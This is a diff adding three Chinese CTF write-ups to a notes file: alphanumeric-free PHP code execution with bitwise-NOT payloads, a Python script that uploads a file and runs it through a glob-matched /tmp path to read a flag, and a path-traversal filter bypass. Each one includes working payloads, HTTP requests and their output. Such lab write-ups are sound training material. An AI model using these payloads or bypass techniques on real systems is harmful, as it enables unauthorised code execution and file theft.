@@ -4844,6 +4844,109 @@ $flag = "CTF{no_space_to_execute_shell_commands}";</div>
 
 ------
 
+### 无字母数字代码执行
+
+进入靶机后随便输入任意内容，可以看到后端报错，靶机使用`eval`来执行字符串。
+
+我们使用工具[无字母数字 RCE Payload 生成器](https://tanyaodan.com/test/RCE/)构造`payload`。将`system('ls')`按位取反+URL编码后，得到`(~%8C%86%8C%8B%9A%92)(~%93%8C);`。
+
+用`Burp Suite`抓包，发送`code=(~%8C%86%8C%8B%9A%92)(~%93%8C);`能看到`flag.php`和`index.php`两个文件。继续发送`system('cat flag')`的`payload`可以拿到`flag`。
+
+```
+POST / HTTP/1.1
+Host: 2492bff6-572c-447b-8106-a8c4cf8b8f4d.challenge.ctf.show
+Content-Length: 66
+Cache-Control: max-age=0
+Origin: http://2492bff6-572c-447b-8106-a8c4cf8b8f4d.challenge.ctf.show
+Content-Type: application/x-www-form-urlencoded
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Accept-Encoding: gzip, deflate, br
+Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
+Connection: keep-alive
+
+code=(~%8C%86%8C%8B%9A%92)(~%9C%9E%8B%DF%99%93%9E%98%D1%8F%97%8F);
+```
+
+提交`CTF{no_characters_to_execute_php_code}`即可。
+
+------
+
+### 无字母数字命令执行
+
+这道题是命令执行无数字，无字母，无回显，利用文件上传+命令执行漏洞循环提取`flag`。
+
+```python
+import requests
+import time
+import sys
+
+TARGET_URL = "http://5fedc0ec-b7a0-4b29-b0f0-ffb5f6b3adf8.challenge.ctf.show/"
+PAYLOAD_FILE_PATH = "payload.txt"
+CHECK_FLAG_STR = "CTF{"
+TIMEOUT_SECONDS = 300  # 5分钟总超时
+
+start_time = time.time()
+with open(PAYLOAD_FILE_PATH, "r", encoding="utf-8") as f:
+    file = {"file": f}
+    data = {"code": ". /???/????????[@-[]"}
+    print(f"开始向 {TARGET_URL} 发送请求...")
+    while time.time() - start_time < TIMEOUT_SECONDS:
+        try:
+            response = requests.post(
+                TARGET_URL, files=file, data=data, timeout=10, allow_redirects=False
+            )
+
+            if CHECK_FLAG_STR in response.text:
+                start = response.text.find(CHECK_FLAG_STR)
+                end = response.text.find("}", start) + 1
+                flag = (
+                    response.text[start:end] if end > start else response.text[start:]
+                )
+                print(f"✅ 找到Flag：{flag}")
+                sys.exit(0)
+            else:
+                print(f"⏳ 未找到flag，1秒后重试...")
+                time.sleep(1)
+
+        except Exception as e:
+            print(f"请求失败：{e}")
+            time.sleep(1)
+
+print(f"⏰ 超时：{TIMEOUT_SECONDS}秒内未找到flag")
+sys.exit(1)
+```
+
+`payload.txt`中的内容是`tac /var/www/html/flag.php`。
+
+第一步：payload.txt 里写死了 tac /var/www/html/flag.php（Linux 命令，反向读取 flag.php 内容）。
+
+第二步：脚本把payload.txt上传到目标服务器（通常会被存在临时目录，如/tmp/phpXXXXXX）。
+
+第三步：通过code参数执行 . /???/???[@-[]，本质是执行上传的临时文件，最终触发`tac flag.php`。
+
+**恶意参数 . /???/???[@-[] 拆解（Linux 绕过技巧）**
+
+|          代码片段           |                         具体含义                          |                        绕过/利用原理                         |
+| :-------------------------: | :-------------------------------------------------------: | :----------------------------------------------------------: |
+|             `.`             |                  Linux的`source`命令缩写                  | 等价于`source`，用于执行指定文件内的命令，避免直接使用`exec/system`等关键字被WAF检测 |
+|           `/???/`           |            路径模糊匹配（`?`匹配任意单个字符）            | 匹配Linux临时文件目录（如`/tmp/`），`/???/` 刚好匹配`/tmp/`（t、m、p各占1个`?`） |
+|         `????????`          |                8个`?`，匹配任意8个连续字符                | 目标服务器接收文件上传后，会将文件保存在`/tmp/`下生成8位随机字符的临时文件（如`phpXXXXXX`） |
+|           `[@-[]`           |       ASCII字符范围匹配（`[@-[]` 对应ASCII码区间）        | 绕过WAF对临时文件名的特征检测，通过字符范围匹配替代直接指定文件名，避免被规则拦截 |
+| 整体 `. /???/????????[@-[]` | 执行`/tmp/`目录下8位字符的临时文件（即上传的payload.txt） | 组合模糊匹配+命令缩写+字符范围，绕过关键字/路径检测，最终执行上传文件中的读flag命令 |
+
+代码运行结果如下：
+
+```
+开始向 http://5fedc0ec-b7a0-4b29-b0f0-ffb5f6b3adf8.challenge.ctf.show/ 发送请求...
+✅ 找到Flag：CTF{no_characters_to_execute_shell_commands_he3e}
+```
+
+提交`CTF{no_characters_to_execute_shell_commands_he3e}`即可。
+
+------
+
 ### 日志文件包含
 
 进入靶机后看到一个PHP LFI/RFI Code Executor。
@@ -5201,6 +5304,66 @@ $flag = "CTF{http_rfi_1s_fun}";            </div-->
 ```
 
 提交`CTF{http_rfi_1s_fun}`即可。
+
+------
+
+### 路径遍历突破
+
+进入靶机后右键查看源码，看到内容如下：
+
+```html
+<div class="container">
+<h1>CTFshow 文件管理助手</h1>
+<form method="get" autocomplete="off">
+    <input type="text" name="path" placeholder="请输入要读取的文件名称" value="">
+    <button type="submit">读取</button>
+</form>
+<div class="browser-window">
+    <div class="browser-bar">
+        <span class="dot red"></span>
+        <span class="dot yellow"></span>
+        <span class="dot green"></span>
+        <span style="margin-left: 18px; color: #00ffe7; font-size: 1em;">
+            test.txt                </span>
+    </div>
+    <div class="browser-content">
+        <span style="color:#888;">目标flag文件为/flag.txt</span>
+    </div>
+</div>
+```
+
+访问`/?path=index.php`可以看到关键代码如下。
+
+```php
+<?php
+if (isset($_GET['path']) && $_GET['path'] !== '') {
+    $path = $_GET['path'];
+    if(preg_match('/data|log|access|pear|tmp|zlib|filter|:/', $path) ){
+        echo '<span style="color:#f00;">禁止访问敏感目录或文件</span>';
+        exit;
+    }
+    #禁止以/或者../开头的文件名
+    if(preg_match('/^(\.|\/)/', $path)){
+        echo '<span style="color:#f00;">禁止以/或者../开头的文件名</span>';
+        exit;
+    }
+    echo $path."内容为：\n";
+    echo str_replace("\n", "<br>", htmlspecialchars(file_get_contents($path)));
+    } else {
+        echo '<span style="color:#888;">目标flag文件为/flag.txt</span>';
+    }
+?>
+```
+
+这里要用的路径穿越，如果使用想要回到`/`目录，可以使用`../../../`一步步往上走，但是这里禁止`/`或者`../`开头，所以可以尝试在前面添加一个不存在的路径`a`，在寻找文件时，会自动忽略不存在的目录，继续后面的目录穿越操作，最后访问到服务器的根目录。
+
+服务器的`index.php`路径通常在`/var/www/html/`目录，构造`/?path=a/../../../../flag.txt`，可以看到以下内容：
+
+```
+a/../../../../flag.txt内容为： FLAG = "CTF{file_path_bypass_is_fun}"
+```
+
+提交`CTF{file_path_bypass_is_fun}`即可。
 
 ------
 
